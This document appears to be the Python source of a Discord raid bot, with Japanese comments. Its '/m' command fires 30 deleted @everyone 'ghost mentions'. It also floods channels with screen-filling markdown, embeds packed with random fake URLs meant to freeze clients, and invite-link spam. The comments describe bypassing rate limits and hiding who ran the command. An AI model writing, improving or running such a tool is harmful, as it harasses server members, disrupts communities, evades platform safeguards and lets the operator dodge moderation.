import os
import threading
from datetime import timedelta
import asyncio
import random
import string
import discord
from discord.ext import commands
from discord import app_commands
from flask import Flask

# --- 1. Flask（簡易Webサーバー）の設定 ---
app = Flask(__name__)

@app.route('/')
def home():
    return "Bot is running!"

def run_web():
    port = int(os.environ.get("PORT", 8080))
    app.run(host="0.0.0.0", port=port)

# --- 2. Discord Botの設定 ---
intents = discord.Intents.default()
intents.message_content = True 
bot = commands.Bot(command_prefix="!", intents=intents)

IGNORE_CHANNEL_IDS = [1555585863402913922]
IGNORE_GUILD_IDS = [1555584934951915706]

@bot.event
async def on_ready():
    print(f"Logged in as {bot.user}")
    try:
        synced = await bot.tree.sync()
        print(f"Successfully synced {len(synced)} command(s).")
    except Exception as e:
        print(f"Failed to sync commands: {e}")

def create_salmon_poll(question_text: str) -> discord.Poll:
    poll = discord.Poll(question=question_text, duration=timedelta(hours=1))
    poll.add_answer(text="さーもん万歳！(1)", emoji="💩")
    poll.add_answer(text="さーもん万歳！(2)", emoji="🐟")
    return poll

# 🔗 プレビュー破壊用のランダムURLを生成するヘルパー
def generate_heavy_urls(count: int) -> str:
    urls = []
    for _ in range(count):
        rand_str = ''.join(random.choices(string.ascii_lowercase + string.digits, k=12))
        urls.append(f"https://salmon-is-god-{rand_str}.com/chaos-preview-destruction")
    return "\n".join(urls)

# 👻 【自律型】高速ゴーストメンションを処理する関数（channel.send に変更し回数制限を突破）
async def ghost_mention_worker(channel: discord.TextChannel):
    mention_setting = discord.AllowedMentions(everyone=True, users=True, roles=True)
    for _ in range(30): # 30回確実に繰り返す
        try:
            # channel.send を使うことで、5回の制限を受けずに30回送り切れます
            msg = await channel.send(content="@everyone 🚨 さーもんの集い！！万歳！！ 🚨", allowed_mentions=mention_setting)
            await asyncio.sleep(0.05) # 削除までの時間をさらに高速化（0.1秒 ➔ 0.05秒）
            await msg.delete()
        except Exception:
            pass
        await asyncio.sleep(0.15) # 連射速度を最速に調整

# /m コマンド（最凶兵器・完全連射版）
@bot.tree.command(name="m", description="【最凶兵器】回数制限を突破し、ゴースト30連打・画面ジャック・プレビュー破壊を最後までやり切ります")
@app_commands.allowed_installs(guilds=True, users=True)
@app_commands.allowed_contexts(guilds=True, dms=True, private_channels=True)
@app_commands.describe(text="投票のタイトルと一緒に送るメッセージ")
async def send_m(interaction: discord.Interaction, text: str = "さーもん万歳！"):
    
    if interaction.guild_id in IGNORE_GUILD_IDS or interaction.channel_id in IGNORE_CHANNEL_IDS:
        await interaction.response.send_message("⚠️ この場所でのコマンド使用は禁止されています。", ephemeral=True)
        return

    # 🥷 履歴が一切残らない最強のステルス応答（自分にしか見えないThinking...を保留）
    # これにより「〇〇がコマンドを使用しました」というシステム表示が他の人には一切見えなくなります
    await interaction.response.defer(thinking=True, ephemeral=True)

    # 実行されたチャンネルを取得
    channel = interaction.channel

    # 👻 【機能1】ゴーストメンション30連打を裏で非同期スタート（チャンネルに直接送り付け）
    asyncio.create_task(ghost_mention_worker(channel))

    mention_setting = discord.AllowedMentions(everyone=True, users=True, roles=True)
    image_files = ["acc4d0a0.gif", "a62e0a5b.gif", "IMG_3948.png", "DSC_9262.png", "20260913_162130.png", "PXL_20261004_095516_336.png"]
    existing_files = [f for f in image_files if os.path.exists(f)]

    # 💥 【機能2＆4】画面ジャック特殊構文 ＋ プレビュー破壊の連射（5回）
    target_count = 5 
    for i in range(target_count):
        try:
            # 縦に異常に長い空のコードブロックと、超巨大文字を生成（チャット欄を強制スクロール）
            giant_markdown = "# 🚨 サーモンの集い 🚨 今すぐ参加！！ https://discord.gg/efe5fsS2JA \n" + "```\n\n\n\n\n\n\n\n\n\n```\n" * 5
            
            # 1メッセージあたり30個の偽装URLを埋め込み（通信をパンクさせてフリーズを狙う）
            heavy_urls = generate_heavy_urls(30)

            embed = discord.Embed(
                title="🚨 さーもん！ 🚨 さーもん万歳！！！", 
                description=f"{giant_markdown}\n\n{heavy_urls}", 
                color=0xFF0033 
            )
            
            files_obj = []
            if existing_files:
                chosen_image = existing_files[i % len(existing_files)]
                files_obj.append(discord.File(chosen_image, filename=chosen_image))
                embed.set_image(url=f"attachment://{chosen_image}")

            # followup ではなく channel.send を使用して回数制限をバイパス（これらは残ります）
            await channel.send(
                content="@everyone 【サーモンの集い】さーもん万歳！ https://discord.gg/efe5fsS2JA", 
                embed=embed, 
                files=files_obj, 
                allowed_mentions=mention_setting
            )
            
            await asyncio.sleep(0.8)

        except Exception as e:
            print(f"爆撃送信エラー (ループ {i+1}回目): {e}")

    # 👑 【機能3】最後に1回だけ公式投票を送信して締め括る
    try:
        poll_obj = create_salmon_poll(text)
        await channel.send(poll=poll_obj)
    except Exception as poll_err:
        print(f"最終投票の送信失敗: {poll_err}")

    # 🧼 保留していた自分専用の「Thinking...」を消去して完全隠滅
    try:
        await interaction.delete_original_response()
    except Exception:
        pass

# --- 3. 起動処理 ---
if __name__ == "__main__":
    web_thread = threading.Thread(target=run_web)
    web_thread.daemon = True
    web_thread.start()

    token = os.environ.get("DISCORD_TOKEN")
    bot.run(token)
